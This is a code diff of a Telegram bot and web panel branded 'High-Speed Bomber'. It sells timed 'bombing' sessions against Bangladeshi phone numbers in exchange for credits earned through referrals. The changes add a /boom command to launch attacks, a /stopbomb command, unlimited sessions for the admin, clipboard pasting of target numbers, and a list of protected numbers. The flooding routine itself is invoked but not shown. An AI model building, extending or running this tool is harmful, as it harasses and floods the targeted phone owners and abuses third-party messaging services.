+  .toast.error { background: rgba(255,59,59,0.15); border-color: rgba(255,59,59,0.5); color: #ff8a8a; box-shadow: 0 10px 40px rgba(255,59,59,0.3); }
+  .toast.success { background: rgba(0,255,65,0.15); border-color: rgba(0,255,65,0.5); color: var(--green); box-shadow: 0 10px 40px rgba(0,255,65,0.3); }
+  .toast.info { background: rgba(0,255,208,0.12); border-color: rgba(0,255,208,0.4); color: var(--cyan); }
   @keyframes toastIn { from { opacity: 0; transform: translate(-50%, -20px); } to { opacity: 1; transform: translate(-50%, 0); } }
   @keyframes toastOut { to { opacity: 0; transform: translate(-50%, -20px); } }
 
-  /* ====== LOCK SCREEN ====== */
-  #lockScreen {
-    display: none;
-    text-align: center;
-    padding: 50px 24px;
-    background: var(--panel);
-    border: 1px solid rgba(255,59,59,0.4);
-    border-radius: 24px;
-    backdrop-filter: blur(24px);
-  }
+  /* LOCK SCREEN */
+  #lockScreen { display: none; text-align: center; padding: 50px 24px; background: var(--panel); border: 1px solid rgba(255,59,59,0.4); border-radius: 24px; backdrop-filter: blur(24px); }
   #lockScreen.show { display: block; }
-  #lockScreen .lock-icon {
-    font-size: 60px;
-    margin-bottom: 20px;
-    filter: drop-shadow(0 0 20px rgba(255,59,59,0.6));
-  }
-  #lockScreen h2 {
-    font-family: 'Courier New', monospace;
-    color: var(--red);
-    font-size: 24px;
-    margin-bottom: 12px;
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    text-shadow: 0 0 20px rgba(255,59,59,0.6);
-  }
-  #lockScreen p {
-    color: #b08080;
-    font-size: 14px;
-    line-height: 1.7;
-    margin-bottom: 24px;
-  }
-  .btn-ghost {
-    padding: 14px 32px;
-    background: rgba(255,59,59,0.15);
-    border: 1px solid rgba(255,59,59,0.5);
-    border-radius: 100px;
-    color: #ff8a8a;
-    font-family: 'Courier New', monospace;
-    font-weight: 800;
-    font-size: 13px;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: all .2s;
-  }
+  #lockScreen .lock-icon { font-size: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(255,59,59,0.6)); }
+  #lockScreen h2 { font-family: 'Courier New', monospace; color: var(--red); font-size: 24px; margin-bottom: 12px; letter-spacing: 3px; text-transform: uppercase; text-shadow: 0 0 20px rgba(255,59,59,0.6); }
+  #lockScreen p { color: #b08080; font-size: 14px; line-height: 1.7; margin-bottom: 24px; }
+  .btn-ghost { padding: 14px 32px; background: rgba(255,59,59,0.15); border: 1px solid rgba(255,59,59,0.5); border-radius: 100px; color: #ff8a8a; font-family: 'Courier New', monospace; font-weight: 800; font-size: 13px; letter-spacing: 2px; text-transform: uppercase; cursor: pointer; transition: all .2s; }
   .btn-ghost:active { transform: scale(0.95); }
 
-  /* ====== FOOTER ====== */
-  .footer {
-    text-align: center;
-    padding: 12px 0 0;
-    font-size: 11px;
-    color: var(--muted);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-  }
+  /* FOOTER */
+  .footer { text-align: center; padding: 12px 0 0; font-size: 11px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; }
   .footer strong { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.5); }
 
-  /* ====== SETTINGS POPUP ====== */
-  .overlay {
-    position: fixed; inset: 0; z-index: 9998;
-    background: rgba(0,0,0,0.9);
-    backdrop-filter: blur(12px);
-    display: none;
-    align-items: center; justify-content: center;
-    padding: 20px;
-  }
+  /* MODAL */
+  .overlay { position: fixed; inset: 0; z-index: 9998; background: rgba(0,0,0,0.9); backdrop-filter: blur(12px); display: none; align-items: center; justify-content: center; padding: 20px; }
   .overlay.show { display: flex; }
-  .modal {
-    background: linear-gradient(160deg, #0a1a10, #050a08);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 32px 24px;
-    max-width: 380px; width: 100%;
-    text-align: center;
-    box-shadow: 0 30px 80px rgba(0,255,65,0.2);
-    animation: modalIn .3s ease-out;
-  }
+  .modal { background: linear-gradient(160deg, #0a1a10, #050a08); border: 1px solid var(--border); border-radius: 24px; padding: 32px 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 30px 80px rgba(0,255,65,0.2); animation: modalIn .3s ease-out; }
   @keyframes modalIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-  .modal h3 {
-    font-family: 'Courier New', monospace;
-    color: var(--green);
-    font-size: 20px;
-    letter-spacing: 3px;
-    margin-bottom: 8px;
-    text-transform: uppercase;
-  }
+  .modal h3 { font-family: 'Courier New', monospace; color: var(--green); font-size: 20px; letter-spacing: 3px; margin-bottom: 8px; text-transform: uppercase; }
   .modal p { color: var(--muted); font-size: 13px; line-height: 1.6; margin-bottom: 20px; }
-  .modal-btn {
-    padding: 14px 30px;
-    background: linear-gradient(135deg, var(--green), #00cc33);
-    border: none;
-    border-radius: 100px;
-    color: #000;
-    font-family: 'Courier New', monospace;
-    font-weight: 900;
-    font-size: 14px;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    cursor: pointer;
-    margin: 4px;
-    transition: all .2s;
-  }
-  .modal-btn.ghost {
-    background: rgba(0,255,65,0.1);
-    border: 1px solid var(--border);
-    color: var(--green);
-  }
+  .modal-btn { padding: 14px 30px; background: linear-gradient(135deg, var(--green), #00cc33); border: none; border-radius: 100px; color: #000; font-family: 'Courier New', monospace; font-weight: 900; font-size: 14px; letter-spacing: 2px; text-transform: uppercase; cursor: pointer; margin: 4px; transition: all .2s; }
+  .modal-btn.ghost { background: rgba(0,255,65,0.1); border: 1px solid var(--border); color: var(--green); }
   .modal-btn:active { transform: scale(0.96); }
 
   ::-webkit-scrollbar { width: 0; }
@@ -940,8 +608,6 @@ HTML_TEMPLATE = r"""
 <div id="toastBox"></div>
 
 <div class="app">
-
-  <!-- TOP BAR -->
   <div class="top-bar">
     <div class="credits-pill">
       <span class="icon">💎</span>
@@ -951,21 +617,19 @@ HTML_TEMPLATE = r"""
     <button class="close-btn" onclick="confirmExit()">✕</button>
   </div>
 
-  <!-- BRAND -->
   <div class="brand">
     <h1>MZ MINHAZ</h1>
     <div class="tagline">High-Speed Bomber</div>
     <div class="divider"></div>
   </div>
 
-  <!-- MAIN PANEL -->
   <div id="mainPanel" style="display:none;">
-
     <div class="card">
       <div class="label"><span class="ico">📱</span> Target Phone</div>
       <div class="phone-wrap">
         <span class="phone-prefix">01</span>
         <input type="tel" id="phone" placeholder="XXXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="off">
+        <button class="paste-btn" onclick="pasteNumber()" title="Paste Number">📋</button>
       </div>
     </div>
 
@@ -1034,17 +698,14 @@ HTML_TEMPLATE = r"""
     <div class="footer">Developed by <strong>MZ MINHAZ</strong></div>
   </div>
 
-  <!-- LOCK SCREEN -->
   <div id="lockScreen">
     <div class="lock-icon">🔒</div>
     <h2>Access Locked</h2>
     <p id="lockMsg">You need at least 1 credit to start bombing. Invite friends to earn more credits.</p>
     <button class="btn-ghost" onclick="tg.close()">Close Panel</button>
   </div>
-
 </div>
 
-<!-- EXIT CONFIRM MODAL -->
 <div class="overlay" id="exitModal">
   <div class="modal">
     <h3>Close Panel?</h3>
@@ -1059,13 +720,11 @@ HTML_TEMPLATE = r"""
   if (tg) { tg.ready(); tg.expand(); }
   const initData = tg?.initData || '';
 
-  // ===== STATE =====
   const state = {
     phone: '', speed: 'medium', running: false,
     credits: 0, endTime: 0, total: 0, ok: 0, fail: 0
   };
 
-  // ===== HAPTIC =====
   function haptic(type) {
     try {
       if (!tg?.HapticFeedback) return;
@@ -1076,7 +735,6 @@ HTML_TEMPLATE = r"""
     } catch(e) {}
   }
 
-  // ===== TOAST =====
   function toast(msg, type = 'info') {
     const box = document.getElementById('toastBox');
     const el = document.createElement('div');
@@ -1086,7 +744,7 @@ HTML_TEMPLATE = r"""
     setTimeout(() => el.remove(), 3200);
   }
 
-  // ===== MATRIX RAIN =====
+  // ===== MATRIX EFFECT =====
   (function() {
     const c = document.getElementById('matrix');
     const ctx = c.getContext('2d');
@@ -1117,11 +775,44 @@ HTML_TEMPLATE = r"""
     setInterval(draw, 60);
   })();
 
-  // ===== PHONE INPUT =====
+  // ===== PHONE INPUT & PASTE LOGIC =====
   const phoneInput = document.getElementById('phone');
   phoneInput.addEventListener('input', function() {
     this.value = this.value.replace(/\D/g, '').slice(0, 9);
   });
+
+  async function pasteNumber() {
+    try {
+      let text = '';
+      if (tg && tg.readTextFromClipboard) {
+        text = await tg.readTextFromClipboard();
+      } else {
+        text = await navigator.clipboard.readText();
+      }
+      
+      if (!text) {
+        toast('Clipboard is empty!', 'info');
+        haptic('error');
+        return;
+      }
+
+      let digits = text.replace(/\D/g, '');
+      
+      // Take the last 9 digits (BD mobile numbers are 9 digits after 01)
+      if (digits.length >= 9) {
+        digits = digits.slice(-9);
+        phoneInput.value = digits;
+        haptic('success');
+        toast('Number pasted!', 'success');
+      } else {
+        toast('Invalid number in clipboard', 'error');
+        haptic('error');
+      }
+    } catch (e) {
+      toast('Cannot read clipboard. Paste manually.', 'error');
+      haptic('error');
+    }
+  }
 
   // ===== SPEED SELECTOR =====
   document.querySelectorAll('.speed-pill').forEach(p => {
@@ -1133,7 +824,6 @@ HTML_TEMPLATE = r"""
     });
   });
 
-  // ===== ANIMATE NUMBER =====
   function setNum(id, val, bump = true) {
     const el = document.getElementById(id);
     if (!el) return;
@@ -1146,7 +836,6 @@ HTML_TEMPLATE = r"""
     }
   }
 
-  // ===== AUTH =====
   async function checkAuth() {
     try {
       const r = await fetch('/api/auth', {
@@ -1173,7 +862,6 @@ HTML_TEMPLATE = r"""
     }
   }
 
-  // ===== POLL =====
   async function pollStatus() {
     try {
       const r = await fetch('/api/status', {
@@ -1203,7 +891,6 @@ HTML_TEMPLATE = r"""
     } catch(e) {}
   }
 
-  // ===== UPDATE UI =====
   function updateUI() {
     const startBtn = document.getElementById('startBtn');
     const stopBtn = document.getElementById('stopBtn');
@@ -1226,24 +913,25 @@ HTML_TEMPLATE = r"""
     }
   }
 
-  // ===== TIMER =====
   setInterval(() => {
-    if (!state.running || !state.endTime) return;
+    if (!state.running) return;
+    if (state.endTime === 0) {
+        document.getElementById('timerVal').textContent = "UNLIMITED";
+        document.getElementById('progressFill').style.width = "100%";
+        return;
+    }
+    if (!state.endTime) return;
     const now = Date.now() / 1000;
     const left = Math.max(0, state.endTime - now);
     const h = Math.floor(left / 3600);
     const m = Math.floor((left % 3600) / 60);
     const s = Math.floor(left % 60);
-    document.getElementById('timerVal').textContent =
-      String(h).padStart(2,'0') + ':' +
-      String(m).padStart(2,'0') + ':' +
-      String(s).padStart(2,'0');
+    document.getElementById('timerVal').textContent = String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
     const total = 3 * 3600;
     const pct = Math.min(100, ((total - left) / total) * 100);
     document.getElementById('progressFill').style.width = pct + '%';
   }, 1000);
 
-  // ===== START =====
   async function startAttack() {
     const digits = phoneInput.value.replace(/\D/g, '');
     if (digits.length !== 9) {
@@ -1253,11 +941,9 @@ HTML_TEMPLATE = r"""
       return;
     }
     const fullPhone = '01' + digits;
-
     haptic('medium');
     const btn = document.getElementById('startBtn');
     btn.disabled = true;
-
     try {
       const r = await fetch('/api/start', {
         method: 'POST',
@@ -1281,7 +967,6 @@ HTML_TEMPLATE = r"""
     }
   }
 
-  // ===== STOP =====
   async function stopAttack() {
     haptic('medium');
     try {
@@ -1297,20 +982,13 @@ HTML_TEMPLATE = r"""
     }
   }
 
-  // ===== EXIT =====
   function confirmExit() {
     haptic('light');
     document.getElementById('exitModal').classList.add('show');
   }
-  function closeExitModal() {
-    document.getElementById('exitModal').classList.remove('show');
-  }
-  function doExit() {
-    closeExitModal();
-    if (tg?.close) tg.close();
-  }
+  function closeExitModal() { document.getElementById('exitModal').classList.remove('show'); }
+  function doExit() { closeExitModal(); if (tg?.close) tg.close(); }
 
-  // ===== INIT =====
   window.addEventListener('load', () => {
     if (!initData) {
       document.getElementById('loader').classList.add('hide');
@@ -1357,19 +1035,26 @@ def api_start():
     chat_id = user['id']
     phone = data.get('phone', '').strip()
     speed = data.get('speed', 'fast')
+    
     if len(phone) != 11 or not phone.startswith('01'):
         return jsonify({'status': 'error', 'message': 'Invalid phone.'})
+        
+    # ===== CHECK PROTECTED NUMBERS =====
+    pd = fmtnum(phone)
+    if pd['z'] in PROTECTED_NUMBERS:
+        return jsonify({'status': 'error', 'message': '🚫 This number is protected and cannot be bombed!'})
+    # ===================================
+
     with bot_attack_lock:
         if chat_id in bot_attacks and bot_attacks[chat_id].get("running"):
             return jsonify({'status': 'error', 'message': 'Attack already running'})
+    end_time = time.time() + BOMB_DURATION_SEC if chat_id != ADMIN_ID else 0
     if chat_id != ADMIN_ID:
         if not credits_take(chat_id, 1):
             return jsonify({'status': 'error', 'message': 'Not enough credits'})
-    end_time = time.time() + BOMB_DURATION_SEC
     with bot_attack_lock:
         bot_attacks[chat_id] = {
-            "running": True, "stop_flag": False,
-            "total": 0, "ok": 0, "fail": 0,
+            "running": True, "stop_flag": False, "total": 0, "ok": 0, "fail": 0,
             "phone": phone, "end_time": end_time
         }
     _spawn(phone, speed, chat_id, bot_attacks, bot_attack_lock, end_time)
@@ -1398,17 +1083,12 @@ def api_status():
         row = user_get(chat_id)
         credits = row[1] if row else 0
         return jsonify({
-            'status': 'ok',
-            'running': st.get('running', False),
-            'total': st.get('total', 0),
-            'ok': st.get('ok', 0),
-            'fail': st.get('fail', 0),
-            'phone': st.get('phone', ''),
-            'credits': credits,
-            'end_time': st.get('end_time', 0)
+            'status': 'ok', 'running': st.get('running', False),
+            'total': st.get('total', 0), 'ok': st.get('ok', 0), 'fail': st.get('fail', 0),
+            'phone': st.get('phone', ''), 'credits': credits, 'end_time': st.get('end_time', 0)
         })
 
-# ============ BOT HANDLERS ============
+# ============ BOT HANDLERS & LOGIC ============
 BOT_USERNAME = None
 
 async def is_joined(context, user_id):
@@ -1462,6 +1142,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     row = user_get(chat_id)
     credits = row[1] if row else 0
     ref_link = f"https://t.me/{BOT_USERNAME}?start=ref_{chat_id}"
+    
     text = (
         f"👋 *Welcome, {user.first_name}!*\n\n"
         f"👨‍💻 Developer: *{DEVELOPER_NAME}*\n"
@@ -1470,20 +1151,91 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👥 Invite friends → *+{REF_CREDITS} credits* each.\n"
         f"⏱ 1 credit = *3 hours* of bombing.\n\n"
         f"🔗 Referral link:\n`{ref_link}`\n\n"
-        f"📢 Channel: {CHANNEL_URL}"
+        f"📢 Channel: {CHANNEL_URL}\n\n"
+        f"*Commands:*\n"
+        f"/boom `01XXXXXXXXX` - Start bombing\n"
+        f"/stopbomb - Stop bombing"
     )
     
     kb = [
         [InlineKeyboardButton("🚀 Start Bombing (Web Panel)", web_app=WebAppInfo(url=WEBAPP_URL))],
-        [InlineKeyboardButton("📢 Channel", url=CHANNEL_URL),
-         InlineKeyboardButton("💎 Balance", callback_data="balance")]
+        [InlineKeyboardButton("📢 Channel", url=CHANNEL_URL), InlineKeyboardButton("💎 Balance", callback_data="balance")]
     ]
-    
-    # Only show this to Admin
     if chat_id == ADMIN_ID:
         kb.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
         
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
+
+async def cmd_boom(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    chat_id = user.id
+    if is_banned(chat_id):
+        await update.message.reply_text("🚫 You are banned.")
+        return
+    if not await gate(update, context): return
+
+    if not context.args:
+        await update.message.reply_text("⚠️ *Usage:* `/boom 01XXXXXXXXX`", parse_mode=ParseMode.MARKDOWN)
+        return
+
+    phone = context.args[0].strip()
+    if not phone.startswith('01') or len(phone) != 11 or not phone.isdigit():
+        await update.message.reply_text("❌ *Invalid number!* Must be 11 digits starting with 01.")
+        return
+
+    # ===== CHECK PROTECTED NUMBERS =====
+    pd = fmtnum(phone)
+    if pd['z'] in PROTECTED_NUMBERS:
+        await update.message.reply_text("🚫 *Access Denied!* This number is protected and cannot be bombed.", parse_mode=ParseMode.MARKDOWN)
+        return
+    # ===================================
+
+    with bot_attack_lock:
+        if chat_id in bot_attacks and bot_attacks[chat_id].get("running"):
+            await update.message.reply_text("⚠️ You already have an active bombing session! Use `/stopbomb` to stop it first.")
+            return
+
+    if chat_id != ADMIN_ID:
+        if not credits_take(chat_id, 1):
+            await update.message.reply_text("❌ *Not enough credits!* You need at least 1 credit to start bombing.", parse_mode=ParseMode.MARKDOWN)
+            return
+        end_time = time.time() + BOMB_DURATION_SEC
+        time_str = "3 Hours"
+    else:
+        end_time = 0
+        time_str = "Unlimited"
+
+    with bot_attack_lock:
+        bot_attacks[chat_id] = {
+            "running": True, "stop_flag": False, "total": 0, "ok": 0, "fail": 0,
+            "phone": phone, "end_time": end_time
+        }
+    _spawn(phone, "fast", chat_id, bot_attacks, bot_attack_lock, end_time)
+    db_query("UPDATE users SET total_attacks = total_attacks + 1 WHERE chat_id=?", (chat_id,))
+    row = user_get(chat_id)
+    credits = row[1] if row else 0
+
+    text = (
+        f"🚀 *Bombing Started!*\n\n"
+        f"📱 Target: `{phone}`\n"
+        f"⏱ Duration: *{time_str}*\n"
+        f"💎 Credits Left: *{credits}*\n\n"
+        f"Use /stopbomb to stop."
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+async def cmd_stopbomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await gate(update, context): return
+    user = update.effective_user
+    chat_id = user.id
+    with bot_attack_lock:
+        st = bot_attacks.get(chat_id)
+        if not st or not st.get("running"):
+            await update.message.reply_text("❌ You don't have any active bombing session.")
+            return
+        st["stop_flag"] = True
+        total, ok, fail = st["total"], st["ok"], st["fail"]
+    await update.message.reply_text(f"⏹ *Bombing Stopped!*\n\n📊 Total: {total} | ✅ {ok} | ❌ {fail}", parse_mode=ParseMode.MARKDOWN)
 
 async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await gate(update, context): return
@@ -1491,19 +1243,13 @@ async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not row:
         await update.effective_message.reply_text("Use /start first.")
         return
-    await update.effective_message.reply_text(
-        f"💎 *Balance:* {row[1]} credits\n⚔️ Total attacks: {row[5]}",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.effective_message.reply_text(f"💎 *Balance:* {row[1]} credits\n⚔️ Total attacks: {row[5]}", parse_mode=ParseMode.MARKDOWN)
 
 async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await gate(update, context): return
     chat_id = update.effective_user.id
     link = f"https://t.me/{BOT_USERNAME}?start=ref_{chat_id}"
-    await update.effective_message.reply_text(
-        f"👥 *Referral Link*\n\n`{link}`\n\nEach friend earns you *+{REF_CREDITS} credits*.",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.effective_message.reply_text(f"👥 *Referral Link*\n\n`{link}`\n\nEach friend earns you *+{REF_CREDITS} credits*.", parse_mode=ParseMode.MARKDOWN)
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
@@ -1525,19 +1271,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============ ADMIN PANEL LOGIC ============
 async def _show_admin_panel(update_or_query, edit=False):
     kb = [
-        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
-         InlineKeyboardButton("👥 User List", callback_data="admin_userinfo")],
-        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_add"),
-         InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove")],
-        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
-         InlineKeyboardButton("🚫 Ban", callback_data="admin_ban"),
-         InlineKeyboardButton("✅ Unban", callback_data="admin_unban")],
+        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"), InlineKeyboardButton("👥 User List", callback_data="admin_userinfo")],
+        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_add"), InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove")],
+        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("🚫 Ban", callback_data="admin_ban"), InlineKeyboardButton("✅ Unban", callback_data="admin_unban")],
         [InlineKeyboardButton("🔙 Close", callback_data="admin_close")]
     ]
-    text = (
-        f"👑 *Admin Panel - {DEVELOPER_NAME}*\n\n"
-        f"Use buttons below to manage the bot."
-    )
+    text = f"👑 *Admin Panel - {DEVELOPER_NAME}*\n\nUse buttons below to manage the bot."
     if edit and hasattr(update_or_query, "edit_message_text"):
         await update_or_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
     else:
@@ -1549,9 +1288,7 @@ async def _show_user_list(q, page=0):
     offset = page * limit
     users = db_query("SELECT chat_id, first_name, username, credits, banned FROM users LIMIT ? OFFSET ?", (limit, offset), fetch=True)
     total_users = db_query("SELECT COUNT(*) FROM users", fetch=True)[0][0]
-    
     total_pages = max(1, (total_users + limit - 1) // limit)
-    
     text = f"👥 *User List* ({total_users} total)\n📄 Page {page+1}/{total_pages}\n\n"
     if not users:
         text += "No users found in database."
@@ -1561,27 +1298,18 @@ async def _show_user_list(q, page=0):
             status = "🚫" if banned else "✅"
             name = fname if fname else "No Name"
             uname_str = f"@{uname}" if uname else ""
-            text += f"{status} *{name}* {uname_str}\n"
-            text += f"🆔 `{chat_id}` | 💎 {credits}\n\n"
-            
+            text += f"{status} *{name}* {uname_str}\n🆔 `{chat_id}` | 💎 {credits}\n\n"
     kb = []
     nav_row = []
-    if page > 0:
-        nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_userlist_{page-1}"))
-    if page < total_pages - 1:
-        nav_row.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_userlist_{page+1}"))
-        
-    if nav_row:
-        kb.append(nav_row)
-        
+    if page > 0: nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_userlist_{page-1}"))
+    if page < total_pages - 1: nav_row.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_userlist_{page+1}"))
+    if nav_row: kb.append(nav_row)
     kb.append([InlineKeyboardButton("🔍 Search by ID", callback_data="admin_search_user")])
     kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_back")])
-    
     await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
 
 async def _handle_admin_input(update, context, action, txt):
     context.user_data["admin_action"] = None
-
     if action == "add":
         parts = txt.split()
         if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
@@ -1594,7 +1322,6 @@ async def _handle_admin_input(update, context, action, txt):
         credits_add(target, amt)
         row = user_get(target)
         await update.message.reply_text(f"✅ Added {amt} credits to `{target}`. New balance: {row[1]}", parse_mode=ParseMode.MARKDOWN)
-
     elif action == "remove":
         parts = txt.split()
         if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
@@ -1607,7 +1334,6 @@ async def _handle_admin_input(update, context, action, txt):
         credits_add(target, -amt)
         row = user_get(target)
         await update.message.reply_text(f"✅ Removed {amt} from `{target}`. New balance: {row[1]}", parse_mode=ParseMode.MARKDOWN)
-
     elif action == "userinfo":
         if not txt.isdigit():
             await update.message.reply_text("❌ Send a numeric chat_id.")
@@ -1616,38 +1342,25 @@ async def _handle_admin_input(update, context, action, txt):
         if not row:
             await update.message.reply_text("❌ User not found.")
             return
-            
         extra = db_query("SELECT first_name, username FROM users WHERE chat_id=?", (int(txt),), fetch=True)[0]
         fname = extra[0] or "No Name"
         uname = f"@{extra[1]}" if extra[1] else "None"
-        
         await update.message.reply_text(
-            f"👤 *User Info*\n\n"
-            f"🆔 `{row[0]}`\n"
-            f"📝 Name: {fname}\n"
-            f"📧 Username: {uname}\n"
-            f"💎 Credits: {row[1]}\n"
-            f"👥 Referred by: {row[2]}\n"
-            f"🚫 Banned: {row[3]}\n"
-            f"⚔️ Attacks: {row[5]}",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to List", callback_data="admin_userinfo")]])
+            f"👤 *User Info*\n\n🆔 `{row[0]}`\n📝 Name: {fname}\n📧 Username: {uname}\n💎 Credits: {row[1]}\n👥 Referred by: {row[2]}\n🚫 Banned: {row[3]}\n⚔️ Attacks: {row[5]}",
+            parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to List", callback_data="admin_userinfo")]])
         )
-
     elif action == "ban":
         if not txt.isdigit():
             await update.message.reply_text("❌ Send a numeric chat_id.")
             return
         db_query("UPDATE users SET banned=1 WHERE chat_id=?", (int(txt),))
         await update.message.reply_text(f"🚫 Banned `{txt}`", parse_mode=ParseMode.MARKDOWN)
-
     elif action == "unban":
         if not txt.isdigit():
             await update.message.reply_text("❌ Send a numeric chat_id.")
             return
         db_query("UPDATE users SET banned=0 WHERE chat_id=?", (int(txt),))
         await update.message.reply_text(f"✅ Unbanned `{txt}`", parse_mode=ParseMode.MARKDOWN)
-
     elif action == "broadcast":
         rows = db_query("SELECT chat_id FROM users", fetch=True)
         sent = 0; failed = 0
@@ -1661,52 +1374,32 @@ async def _handle_admin_input(update, context, action, txt):
         await update.message.reply_text(f"📢 Broadcast done.\n✅ Sent: {sent} | ❌ Failed: {failed}")
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text:
-        return
+    if not update.message or not update.message.text: return
     user = update.effective_user
     action = context.user_data.get("admin_action")
     if action and user.id == ADMIN_ID:
-        txt = update.message.text.strip()
-        await _handle_admin_input(update, context, action, txt)
-        return
+        await _handle_admin_input(update, context, action, update.message.text.strip())
 
 async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
     data = q.data
     user = q.from_user
-
     if user.id != ADMIN_ID:
         await q.answer("❌ Unauthorized Access!", show_alert=True)
         return
-
     if data == "admin_panel":
         await _show_admin_panel(q, edit=True)
-        return
-
-    if data == "admin_stats":
+    elif data == "admin_stats":
         users = db_query("SELECT COUNT(*), SUM(credits), SUM(total_attacks) FROM users", fetch=True)[0]
         active = len([k for k, v in bot_attacks.items() if v.get("running")])
-        await q.edit_message_text(
-            f"📊 *Bot Stats*\n\n"
-            f"👥 Users: {users[0] or 0}\n"
-            f"💎 Total credits: {users[1] or 0}\n"
-            f"⚔️ Total attacks: {users[2] or 0}\n"
-            f"🔥 Active attacks: {active}",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]])
-        )
-    elif data == "admin_userinfo":
-        await _show_user_list(q, 0)
-    elif data.startswith("admin_userlist_"):
-        page = int(data.split("_")[-1])
-        await _show_user_list(q, page)
+        await q.edit_message_text(f"📊 *Bot Stats*\n\n👥 Users: {users[0] or 0}\n💎 Total credits: {users[1] or 0}\n⚔️ Total attacks: {users[2] or 0}\n🔥 Active attacks: {active}",
+            parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_userinfo": await _show_user_list(q, 0)
+    elif data.startswith("admin_userlist_"): await _show_user_list(q, int(data.split("_")[-1]))
     elif data == "admin_search_user":
         context.user_data["admin_action"] = "userinfo"
-        await q.edit_message_text(
-            "👤 Send the user's chat_id:", 
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_userinfo")]])
-        )
+        await q.edit_message_text("👤 Send the user's chat_id:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_userinfo")]]))
     elif data in ("admin_add", "admin_remove", "admin_ban", "admin_unban", "admin_broadcast"):
         prompts = {
             "admin_add": ("add", "➕ Send: `<chat_id> <amount>`", ParseMode.MARKDOWN),
@@ -1717,67 +1410,68 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         }
         act, prompt, mode = prompts[data]
         context.user_data["admin_action"] = act
-        await q.edit_message_text(prompt, parse_mode=mode,
-                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]]))
-    elif data == "admin_back":
-        await _show_admin_panel(q, edit=True)
-    elif data == "admin_close":
-        await q.edit_message_text("👑 Admin panel closed.")
+        await q.edit_message_text(prompt, parse_mode=mode, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]]))
+    elif data == "admin_back": await _show_admin_panel(q, edit=True)
+    elif data == "admin_close": await q.edit_message_text("👑 Admin panel closed.")
 
 async def post_init(app: Application):
     global BOT_USERNAME
+    await app.bot.delete_webhook(drop_pending_updates=True)
     me = await app.bot.get_me()
     BOT_USERNAME = me.username
     try:
-        await app.bot.set_chat_menu_button(
-            menu_button=MenuButtonWebApp(text="🌐 Panel", web_app=WebAppInfo(url=WEBAPP_URL))
-        )
+        await app.bot.set_chat_menu_button(menu_button=MenuButtonWebApp(text="🌐 Panel", web_app=WebAppInfo(url=WEBAPP_URL)))
     except Exception as e:
         print(f"[menu-button] failed: {e}")
 
-# ============ ENTRY ============
+# ============ ENTRY POINT ============
 def run_flask(port):
     app.run(host="127.0.0.1", port=port, debug=False, threaded=True, use_reloader=False)
 
